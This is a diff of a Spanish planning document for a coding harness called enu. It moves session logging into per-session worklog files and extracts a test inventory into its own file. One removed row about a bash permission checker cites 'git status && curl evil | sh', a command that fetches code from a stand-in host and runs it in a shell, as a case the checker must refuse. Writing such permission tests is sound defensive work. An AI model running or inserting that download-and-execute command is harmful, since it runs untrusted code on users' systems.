@@ -16,17 +16,19 @@ orden se levanta el kernel, por qué ese orden y qué hace que una sesión esté
 
 Cada sesión empieza con el contexto en blanco y en un contenedor efímero, así
 que **el estado del progreso vive en el repositorio, no en la memoria de
-Claude**. El mecanismo es el mismo patrón que ya usan `problemas.md` (campo
-*estado*) y `adr.md`: un puntero visible, una bitácora append-only y la
-disciplina de actualizarlos en el commit de la propia feature. Tres fuentes,
-redundantes a propósito:
+Claude**. El mecanismo: un puntero visible y un tablero por fases en
+[estado.md](estado.md), y un **registro por sesión** en
+[docs/worklog/](../worklog/) (un fichero por sesión + índice), actualizados en
+el commit de la propia feature. Fuentes redundantes a propósito:
 
 1. **El puntero** (la única línea imperativa): vive en [estado.md](estado.md).
 2. **El tablero por fases** (vista de pájaro; se marca al cerrar la última
-   sesión de cada fase): en [estado.md](estado.md).
-3. **La bitácora**: una fila por sesión cerrada, con su commit, hallazgos y
-   desviaciones — el "qué pasó y por qué" que el puntero no cuenta. Al final
-   de [estado.md](estado.md).
+   sesión de cada fase) y **«Último cierre»**: en [estado.md](estado.md).
+3. **El registro por sesión**: un fichero `sNN-<slug>.md` en
+   [docs/worklog/](../worklog/) por sesión cerrada, con su commit, hallazgos y
+   desviaciones — el "qué pasó y por qué" que el puntero no cuenta. Su índice
+   `worklog/README.md` es la lista de cierres. (Ya **no** hay bitácora en
+   `estado.md`: el registro por sesión ES el fichero de `worklog/`.)
 
 **Backstop en git**: como cada commit cita su sesión (`S07: ...`), el estado se
 puede reconstruir siempre con `git log --grep '^S[0-9]'` aunque el documento se
@@ -34,19 +36,20 @@ quedara desfasado. El documento manda; git es la red de seguridad.
 
 ### Protocolo de cada sesión
 
-1. **Al empezar**: lee el puntero ▶ y la última fila de la bitácora. Eso es
-   "dónde seguir" y "en qué estado quedó". No empieces otra sesión que la que
-   marca el puntero (el grafo de dependencias es estricto).
+1. **Al empezar**: lee el puntero ▶ y «Último cierre» en `estado.md`, y el
+   último fichero de `worklog/`. Eso es "dónde seguir" y "en qué estado quedó".
+   No empieces otra sesión que la que marca el puntero (el grafo de dependencias
+   es estricto).
 2. **Durante**: implementa **solo** esa sesión, hasta cumplir su Definition of
    Done. Si destapas un hallazgo, párate y resuélvelo por el flujo de diseño
-   (`problemas.md`) antes de seguir codificando.
+   (findings) antes de seguir codificando.
 3. **Al terminar, en el mismo commit que la feature**: avanza el puntero ▶ a la
-   sesión siguiente, marca el tablero si cerraste una fase, y añade una fila a
-   la bitácora. Un commit que toca código pero no mueve el puntero es una
-   sesión a medias.
+   sesión siguiente, marca el tablero y «Último cierre», y crea el fichero
+   `worklog/sNN-<slug>.md` de la sesión (con su fila en el índice). Un commit
+   que toca código pero no mueve el puntero es una sesión a medias.
 4. **Si la sesión cierra una fase**: ejecuta su **Checkpoint de integración**
    (🔎 CP-N, marcado tras la fase) antes de tocar el puntero. Si el checkpoint
-   falla, el puntero se queda donde está y la bitácora anota qué falló: la
+   falla, el puntero se queda donde está y el worklog anota qué falló: la
    siguiente sesión arregla la integración, no abre fase nueva.
 
 ## Antes de empezar: un cambio de fase
@@ -120,47 +123,10 @@ cualquiera de estas:
 
 ### Inventario de lógica clave (🔒 — tests unitarios obligatorios)
 
-Estas sesiones implementan lógica que no puede quedar sin unitario, con el caso
-exacto que cada test debe blindar. Es la lista contra la que se audita una
-sesión antes de cerrarla:
-
-| Sesión | Lógica clave a blindar |
-|---|---|
-| 🔒 **S02** | Forma de la tabla de error `{code,message,detail}`; un código reservado nunca se traga ni se reescribe. |
-| 🔒 **S04** | El puente ⏸ goroutine-por-task + token Lua (ADR-011, cierra G31): suspensión por suelta/recupera del token; `pcall` y tail calls que envuelven un ⏸ sobreviven nativas; cero data races (`-race`). |
-| 🔒 **S06** | `Future`: `set` una sola vez (segundo → `EINVAL`); varios `await` ven el valor ya resuelto. |
-| 🔒 **S07** | `task.all` alinea `out[i]` con `fns[i]` (G27); `race` cancela a las perdedoras. |
-| 🔒 **S08** | Desenrollado **no capturable** por `pcall` (§1.3); orden LIFO de `cleanup`; `ECANCELED` solo observable. |
-| 🔒 **S09** | El watchdog corta el slice excedido y **no** se captura; emite `EBUDGET` + `core:plugin.misbehaved`. |
-| 🔒 **S10** | Despacho sobre **foto** de suscriptores (G10); cancelar surte efecto inmediato; emits anidados **encolados** (anchura, no recursión). |
-| 🔒 **S11** | Orden topológico por `requires`; unicidad de nombre (colisión = error); `init.lua` del usuario el último. |
-| 🔒 **S13** | `reload` no deja handlers huérfanos (etiquetado por dueño, G2). |
-| 🔒 **S14** | Escritura atómica (temporal+rename); `exclusive`=`O_EXCL` → `EEXIST` (G17); `stat` de inexistente → `nil`, no lanza. |
-| 🔒 **S15** | Watcher: entrega **en lotes**, `debounce_ms`, filtrado `gitignore` (G7). |
-| 🔒 **S16** | Vida del proceso: kill por `cleanup`; `alive` informa de existencia, no identidad (pid reciclado → `true`, G17). |
-| 🔒 **S18** | `json` UTF-8 **estricto** → `EINVAL` (G11); sentinel `NULL` ida y vuelta sin perder claves. |
-| 🔒 **S20** | **Parser SSE** de `Stream:events()` (eventos partidos entre chunks, `id`, comentarios); backpressure → `EIO`. |
-| 🔒 **S22** | `text.width`: graphemes, east-asian, emoji ZWJ (la base de todo el layout). |
-| 🔒 **S23** | `markdown` **streaming-safe**: entrada incompleta (bloque de código a medias) no rompe; el Block crece estable. |
-| 🔒 **S25** | `diff`: hunks correctos en inserción/borrado/cambio y en los bordes. |
-| 🔒 **S27** | `fuzzy` ordena por score de forma estable; `files` respeta `.gitignore`. |
-| 🔒 **S29** | `blit` como **viewport**: offsets negativos y recorte por ambos extremos (G28); recorte de región fuera de pantalla en resize sin tocar coordenadas (G1). |
-| 🔒 **S31** | Resolución de **secuencias** de teclas con timeout; pila de input (quien no consume, deja pasar). |
-| 🔒 **S34** | `caps` **deny-by-default**, dos granularidades `"fs"` vs `"fs.read"` (G6); colas acotadas con backpressure. |
-| 🔒 **S35** | Exclusividad `on_message`/`recv` → `EINVAL` en el acto (G8). |
-| 🔒 **G42 (extensión)** | Reintento de la apertura del stream (agente.md §2): SOLO la apertura (a mitad de stream jamás), frontera exacta `max_retries`+1 aperturas, clasificación estricta `detail.retryable == true`, error propagado intacto (con el `retryable` que G43 alza a `agent:error`), cancel durante el backoff aborta sin reabrir. La MISMA política vive **duplicada** en el subagente-worker (herencia del padre incluida): blindar el motor no blinda la copia — tests propios (`agent_g42_test.go`, `agent_g42_worker_test.go`). |
-| 🔒 **G53 (extensión)** | Tokenizador/máquina de estados de permisos de `bash` (`decompose_bash`/`match_bash`, agente.md §5, ADR-023): `allow` concede SOLO si CADA subcomando casa un patrón —`bash:git *` NO concede `git status && curl evil \| sh` (cierra la frontera falsa SEC-02)—; cada operador del contrato (`&&`, `\|\|`, `;`, `\|`, `\|&`, `&`, salto de línea) fuera de comillas separa; `deny` casa si ALGÚN subcomando casa (precedencia absoluta); todo constructo NO MODELABLE (`$( )`, backticks —también dentro de comillas dobles—, `$VAR` en posición de comando, redirecciones, heredocs, subshells/agrupaciones, comillas desbalanceadas) cae FAIL-CLOSED a `ask` (deny en headless), nunca concede (P17); el escape `\` no engaña al rastreador de separadores. El núcleo `deny→allow` se blinda table-driven en `_policy_decision` — tests propios (`agent_g53_test.go`). |
-| 🔒 **G54 (kernel)** | Política de redirects del kernel HTTP (`withRedirectPolicy`/`isCrossHost`, api.md §8; sube `APILevel` a 4): presupuesto `max_redirects` respetado y, al agotarlo, la última `3xx` entregada como DATO (no lanza); `0` = no seguir ninguno; en cada salto **cross-host** (host distinto —nombre y puerto, plegando el default del esquema— o degradación `https`→`http`) se recortan TODAS las cabeceras del llamante, sin lista blanca y sin restaurarlas aunque un salto posterior regrese al host inicial; el upgrade same-host `http`→`https` NO es cross-host (redirect benigno); la política vive en una copia por petición del cliente (no muta el cliente compartido). Cubre `request` y `stream` — tests propios (`http_g54_test.go`). |
-| 🔒 **G57 (kernel)** | `enu.fs.write{ mode }` fija el modo con chmod **no recortado por el umask** (sube `APILevel` a 5), en ambas direcciones (umask laxo no deja el fichero legible por otros; umask estricto no recorta un modo permisivo), componible con `exclusive`, y ganando sobre la preservación del previo en la sobrescritura; `opts.mode` inválido → `EINVAL`. La extensión `sessions` escribe transcript y lock en `0600` (`fs_test.go`; e2e `sessions_test.go`/`chat_test.go` des-amañados: aserción de modo real bajo el umask heredado). |
-| 🔒 **S49** | `enu init` **jamás sobrescribe** un fichero de config existente, en ningún modo ni con `--yes` (pérdida silenciosa de config del usuario = el fallo de borde); semántica por fichero: sobre config parcial escribe exactamente los que faltan; `init --yes`/sin-TTY y `--default-config` producen bytes idénticos (la equivalencia de ADR-026 pieza 2 es un contrato, no una intención); códigos 0 (éxito/no-op), 1, 2. |
-| 🔒 **S50** | `enu doctor`: cada check KERNEL de `doctor.v1` tiene caso verde y caso rojo table-driven (los 4 de producto son `skip` fijo en v1, G62); exit 1 si CUALQUIER check falla (y 0 con `skip`s presentes — los `skip` no ensucian); el valor de la clave **jamás** aparece en ninguna salida (humana ni `--json`, ni en `detail`/`remedy` — la fuga de secretos es el fallo silencioso perfecto); el `--json` valida contra el esquema congelado en doctor.md. |
-| 🔒 **S51** | Verificación de checksum en **Go compartido** (`update` + la que consume `install.sh`): artefacto corrupto o `checksums.txt` ausente → no se toca el binario instalado (instalar un binario corrupto es el fallo silencioso por antonomasia); reemplazo atómico del binario **en uso** (escribir-al-lado + rename; bordes ETXTBSY/cross-device); reinstalar la misma versión = no-op honesto; `uninstall` nunca toca `data_dir()`; destino no escribible → aborta con remedio, jamás eleva privilegios. |
-| 🔒 **S54** | Máquina de estados de la elección en la pantalla desnuda (menú ↔ selección de catálogo): **re-entrada** — una segunda pulsación de activar con el `activateAndBoot` en curso NO dispara otro (doble escritura de `enu.toml`/doble `Boot` es el fallo silencioso); cursor **acotado** a los límites del catálogo (catálogo vacío incluido, sin índice fuera de rango); la acción 1 activa **exactamente** `officialProductSet` (ADR-015: `example` fuera) y la 2 escribe **solo** la embebida elegida; fallo de activación (`enu.toml` malformado → `EINVAL` sin pisar el fichero, G21/S33; `Boot` roto) deja la pantalla viva con el error accionable y la salida por teclado operativa (ADR-017: la terminal jamás queda atrapada en raw mode). |
-
-Las sesiones **fuera** de esta lista (S01, S03, S05, S12, S17, S19, S21, S24,
-S26, S28, S30, S32, S33 y las de extensiones Lua de la Fase 8) se cierran con
-snippet + checkpoint; si al implementarlas aparece lógica propia no trivial, se
-añaden aquí — el inventario crece, nunca se relaja.
+La lista 🔒 —el caso exacto que cada test debe blindar, contra la que se
+audita una sesión antes de cerrarla— vive ahora en su propio fichero:
+**[inventario-tests.md](inventario-tests.md)** (se extrajo para no inflar el
+plan). El protocolo la sigue citando como «el inventario 🔒».
 
 ### Columnas de las tablas
 
@@ -463,7 +429,7 @@ excluido); (2) los gates existentes que toque siguen en verde (`go build
 ./...` si toca el árbol Go, los gates de la web —check-drift, i18n— si toca
 `web/`, la CI si toca workflows); (3) el frente público resultante está **en
 inglés** y la fuente interna en español (ADR-025, pieza 5); y (4) cierra con
-puntero ▶ avanzado y fila de bitácora en el mismo commit, registrando en
+puntero ▶ avanzado y fichero de worklog en el mismo commit, registrando en
 `docs/worklog/sNN-*.md` las decisiones bajo umbral. S46-S48 no aportan filas
 🔒 (no hay lógica de runtime; los workflows de CI son steps, no lógica — sus
 *decisiones* se registran, ver S48). **Las sesiones de subcomandos
@@ -473,7 +439,7 @@ general** y sí alimentan el inventario 🔒 (sus filas, abajo).
 | Sesión | Feature | Depende de | Espec | Criterio de hecho |
 |---|---|---|---|---|
 | **S46** | **README raíz en inglés** según ADR-025: hero directo («a self-extensible coding harness shipped as a single static binary»), quickstart de 3 comandos, diagrama de capas kernel/API/plugins, plugin de ejemplo ~10 líneas, tabla comparativa **con Pi** (honesta: admite madurez/ecosistema superiores), bloque de estado breve y rutas de doc por intención del lector. Elimina del camino de entrada: «45 sesiones cerradas», «la release va por detrás», el CTA a la competencia y el pseudocódigo-como-validación (se enlazan, no se reproducen). Actualiza `filosofia.md` a la tesis de la pieza 1 — **en español** (es fuente interna; puede citar el lema inglés). | — | ADR-025 piezas 1-2 y 5 · [auditoría externa 2026-07-18](../audits/auditoria-externa-concepto-2026-07-18.md) §triaje | El README publicado contiene los siete elementos y ninguno de los cuatro eliminados; `filosofia.md` coherente con ADR-025; versión española enlazada. |
-| **S47** | **Copy de la web a la tesis nueva + legibilidad**: la copy pública (i18n de la portada: slogan/cuerpo es+en) y las páginas `que-es-enu`/`primer-agente` (es/en) se actualizan a la tesis de ADR-025 (motor de harnesses); y la legibilidad de doc larga en `markdown.css` (cuerpo 15-16px, más contraste, ancho de texto 70-75 col). **No** se añade ningún theme (congelación de ADR-025). **Toda la pasada VISUAL de la portada** (demo del hero, snippet de plugin, jerarquía de enlaces primarios sobre atajos, slot de demo) **se descopó a [P43](../postponed/pospuesto.md)** (operador, 2026-07-18): es diseño entrelazado con la demo, que se hace en una sola pasada al final con `forge`+`enu init`. S47 se queda con lo que es coherencia y legibilidad, sin riesgo de diseño. | S46 (el copy nuevo manda) | ADR-025 pieza 3 (Fase 1) y consecuencias · auditoría externa §web | La copy de la portada y las dos páginas reflejan la tesis de motor de harnesses (es+en); la legibilidad de doc larga aplicada; gates de la web (check-drift, i18n) en verde; cero themes nuevos. |
+| **S47** | **Copy de la web a la tesis nueva + legibilidad**: la copy pública (i18n de la portada: slogan/cuerpo es+en) y las páginas `que-es-enu`/`primer-agente` (es/en) se actualizan a la tesis de ADR-025 (motor de harnesses); y la legibilidad de doc larga en `markdown.css` (cuerpo 15-16px, más contraste, ancho de texto 70-75 col). **No** se añade ningún theme (congelación de ADR-025). **Toda la pasada VISUAL de la portada** (demo del hero, snippet de plugin, jerarquía de enlaces primarios sobre atajos, slot de demo) **se descopó a [P43](../postponed/p43-pasada-visual-de-la-portada.md)** (operador, 2026-07-18): es diseño entrelazado con la demo, que se hace en una sola pasada al final con `forge`+`enu init`. S47 se queda con lo que es coherencia y legibilidad, sin riesgo de diseño. | S46 (el copy nuevo manda) | ADR-025 pieza 3 (Fase 1) y consecuencias · auditoría externa §web | La copy de la portada y las dos páginas reflejan la tesis de motor de harnesses (es+en); la legibilidad de doc larga aplicada; gates de la web (check-drift, i18n) en verde; cero themes nuevos. |
 | **S48** | **Matriz de smoke tests de instalación en sistemas limpios**: workflow de CI que mete el binario estático en contenedores mínimos SIN toolchain y ejecuta el humo. Humo (al darse de alta esta sesión NO existía `--version` —llega en S53—; y aun con él, el humo usa `enu -e` a propósito, porque **arranca el runtime**: liveness más fuerte que un print estático de versión): `enu -e 'return enu.version.api'` (arranca el runtime headless, imprime el nivel de API), `enu --default-config` (escribe el conjunto oficial y sale 0), y un segundo `enu -e` con el oficial ya activo. **Matriz cerrada en este alta** (decisión, no step): `debian:stable-slim`, `ubuntu:latest`, `fedora:latest`, `alpine:latest` (sí aplica: binario estático `CGO_ENABLED=0`, ADR-001 — prueba que no hay dependencia de glibc) + macOS ARM (`macos-14`; Intel `macos-13` **descartado** — hardware legacy y runners escasos que encolan la matriz; quien siga en Mac Intel casi siempre corre Linux encima, ya cubierto). Publica el resultado como dato (JSON + resumen). Las decisiones de tubería se registran en el `worklog` de la sesión como refinamiento de ADR-013 (los steps siguen sin ser API). | — | ADR-013 (CI/releases) · ADR-025 pieza 3 (Fase 1) | El workflow corre la matriz completa en verde; un fallo de arranque en cualquier plataforma pone la CI en rojo; la matriz es visible como dato. |
 | **S49** | **`enu init`** — primer subcomando del binario (ADR-026, piezas 1-2): asistente TTY (provider → clave por `api_key_env`, jamás en fichero → modelo → conjunto oficial), semántica **por fichero** de ADR-017 (escribe los que faltan, respeta y lista los existentes; no-op honesto con config completa), sin TTY o `--yes` = equivalente exacto de `--default-config`, códigos 0/1/2, sin red. Incluye el dispatcher de subcomandos de la pieza 1 (regla de frontera gestión/producto). **El wizard v1 ofrece solo `anthropic`** ([G61](../findings/g61-el-wizard-de-init-ofrece-providers-sin-plantilla.md): los otros tres providers no tienen plantilla; diferidos como P44). | — | ADR-026 piezas 1-2 (+ ADR-015/017, cuyas primitivas y plantillas reutiliza) · G61 | `enu init` en TTY limpio deja el harness usable (tres ficheros + mensaje honesto); sobre config parcial escribe solo lo que falta; `enu init --yes` y `enu --default-config` producen ficheros idénticos. |
 | **S50** | **`enu doctor`** (ADR-026, pieza 3): batería de checks de solo lectura sin red por defecto (`--net` opt-in), salida humana + `--json` conforme a **`doctor.v1`** ([docs/ops/doctor.md](../ops/doctor.md), el catálogo de `id` congelado), códigos 0/1/2, remedio accionable por fallo. **Estrechada por [G62](../findings/g62-los-checks-de-producto-de-doctor-presuponen-introspeccion-inexistente.md): v1 implementa los 7 checks KERNEL** (`binary.version`, `config.dir`, `config.parse`, `sessions.perms`, `tty.caps`, `plugins.enabled`, `plugins.requires`); los 4 de PRODUCTO (`provider.model`/`provider.key`/`tools.external`/`provider.reach`) salen como `skip` con remedy→G62 (necesitan introspección de extensiones que no existe, diferida como P45). `plugins.enabled/requires` exponen un método del Runtime que envuelve `discover()`+`topoSort()` **sin `Boot()`** (reusa el loader, no re-implementa). | S49 (dispatcher de subcomandos) | ADR-026 pieza 3 · [doctor.md](../ops/doctor.md) · G62 | `enu doctor` sobre config sana da 0 con los 7 kernel `ok` y los 4 de producto `skip`; romper cada área kernel produce su `fail` con remedio; `--json` valida contra `doctor.v1`; la clave jamás aparece en ninguna salida. |
@@ -545,7 +511,7 @@ encaja; un hito puede *reordenar el plan*):
 
 ## Coherencia con el flujo de diseño
 
-Este plan **no sustituye** al flujo de `problemas.md`/`adr.md`/`pospuesto.md`:
+Este plan **no sustituye** al flujo de `findings/`/`decisions/adr/`/`postponed/`:
 lo consume. Si una sesión destapa una grieta, se abre como `G##`, se resuelve en
 *todos* los documentos afectados y solo entonces se implementa. Si una sesión
 toma una decisión nueva (p. ej. el resultado del spike S28), se registra como un
